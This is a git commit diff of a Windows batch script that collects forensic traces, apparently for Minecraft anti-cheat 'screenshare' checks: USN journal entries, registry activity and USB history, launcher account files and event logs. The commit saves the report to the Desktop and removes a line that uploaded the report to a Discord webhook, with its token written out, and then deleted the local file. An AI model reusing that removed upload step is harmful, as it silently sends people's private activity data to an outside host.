ad6b9b0d3c265a04e3528ca45fdb6545b4899765
Leonardo Galli <leo.galli.iphone@icloud.com>
2026-03-30 20:33:42 +0200

    Remove temporary report file handling

--- stringhe_alt.bat
+++ stringhe_alt.bat
@@ -1,37 +1,36 @@
 @echo off
 setlocal enabledelayedexpansion
+color 0b
+set "R=%userprofile%\Desktop\REPORT_SS_MANUALE.txt"
 
-set "L=%temp%\Report_SS_%username%.txt"
+echo [!] SCANSIONE IN CORSO... IL REPORT APPARIRA SUL DESKTOP.
+echo --- REPORT CONTROLLO SS --- > "%R%"
+echo UTENTE: %username% >> "%R%"
+echo DATA: %date% %time% >> "%R%"
+echo ------------------------------------------ >> "%R%"
 
-echo [!] TARGET: %username% - %date% %time% > "%L%"
-echo ------------------------------------------------ >> "%L%"
+fsutil usn readjournal C: csv | findstr /i /C:"0x80000200" | findstr /i /C:"latest.log" /i /C:".log.gz" /i /C:"launcher_profiles" /i /C:"usernamecache.json" /i /C:"usercache.json" /i /C:"shig.inima" /i /C:"launcher_accounts" /i /C:"lunar" /i /C:"badlion" /i /C:"vape" /i /C:"drip" >> "%R%" 2>nul
 
-fsutil usn readjournal C: csv | findstr /i /C:"0x80000200" | findstr /i /C:"latest.log" /i /C:".log.gz" /i /C:"launcher_profiles.json" /i /C:"usernamecache.json" /i /C:"usercache.json" /i /C:"shig.inima" /i /C:"launcher_accounts.json" /i /C:"launcher_profiles_microsoft_store.json" /i /C:"lunar" /i /C:"badlion" >> "%L%" 2>nul
+fsutil usn readjournal c: csv | findstr /i /C:"0x80000200" /i /C:"0x00001000" /i /C:"0x00002000" | findstr /i /C:".pf" /i /C:".exe" /i /C:".bat" /i /C:".cmd" /i /C:".jar" /i /C:".pif" /i /C:"jnativehook" >> "%R%" 2>nul
 
-fsutil usn readjournal c: csv | findstr /i /C:"0x80000200" /i /C:"0x00001000" /i /C:"0x00002000" | findstr /i /C:".pf" /i /C:".exe" /i /C:".bat" /i /C:".cmd" /i /C:".jar" /i /C:".pif" /i /C:"jnativehook" /i /C:"vape" /i /C:"drip" /i /C:"itami" >> "%L%" 2>nul
+reg query "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /s >> "%R%" 2>nul
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /s >> "%R%" 2>nul
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU" /s >> "%R%" 2>nul
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU" /s >> "%R%" 2>nul
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings" /s >> "%R%" 2>nul
+reg query "HKLM\SYSTEM\ControlSet001\Enum\USB" /s >> "%R%" 2>nul
+reg query "HKLM\SYSTEM\MountedDevices" >> "%R%" 2>nul
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /s >> "%R%" 2>nul
+reg query "HKCU\Software\Microsoft\DirectInput\MostRecentApplication" /s >> "%R%" 2>nul
 
-reg query "HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" /s >> "%L%" 2>nul
-reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /s >> "%L%" 2>nul
-reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU" /s >> "%L%" 2>nul
-reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU" /s >> "%L%" 2>nul
-reg query "HKLM\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings" /s >> "%L%" 2>nul
-reg query "HKLM\SYSTEM\ControlSet001\Enum\USB" /s >> "%L%" 2>nul
-reg query "HKLM\SYSTEM\MountedDevices" >> "%L%" 2>nul
-reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /s >> "%L%" 2>nul
-reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppBadgeUpdated" /s >> "%L%" 2>nul
-reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView" /s >> "%L%" 2>nul
+dir /s /b "%temp%\JNativeHook*" >> "%R%" 2>nul
+dir /s /b "%appdata%\.minecraft\launcher_accounts.json" >> "%R%" 2>nul
+dir /s /b "%appdata%\.minecraft\launcher_profiles.json" >> "%R%" 2>nul
+dir /s /b "%appdata%\.minecraft\versions\*\*.json" >> "%R%" 2>nul
 
-dir /s /b "%temp%\JNativeHook*" >> "%L%" 2>nul
-dir /s /b "%appdata%\.minecraft\launcher_accounts.json" >> "%L%" 2>nul
-dir /s /b "%appdata%\.minecraft\versions\*\*.json" >> "%L%" 2>nul
-dir /s /b "%userprofile%\Downloads\*.jar" >> "%L%" 2>nul
-dir /s /b "%userprofile%\Desktop\*.exe" >> "%L%" 2>nul
+wevtutil qe Security /q:"*[System[(EventID=1102)]]" /f:text /c:1 >> "%R%" 2>nul
+wevtutil qe Security /q:"*[System[(EventID=4616)]]" /f:text /c:1 >> "%R%" 2>nul
 
-wevtutil qe Security /q:"*[System[(EventID=1102)]]" /f:text /c:1 >> "%L%" 2>nul
-wevtutil qe Security /q:"*[System[(EventID=4616)]]" /f:text /c:1 >> "%L%" 2>nul
-wevtutil qe System /q:"*[System[(EventID=104)]]" /f:text /c:1 >> "%L%" 2>nul
-
-curl -X POST -F "file=@%L%" -F "payload_json={\"content\": \"**REPORT SS GENERATO**\nTarget: `%username%`\"}" "https://discord.com/api/webhooks/1488243848496025731/WxeXkRYRM3QgUH-2gxFLf467nJZOSyBi7Uuk_rh-d71Pam1BgF6wN1si3imYYciR5pDT"
-
-del "%L%"
+echo --- FINE REPORT --- >> "%R%"
+start notepad.exe "%R%"
 exit
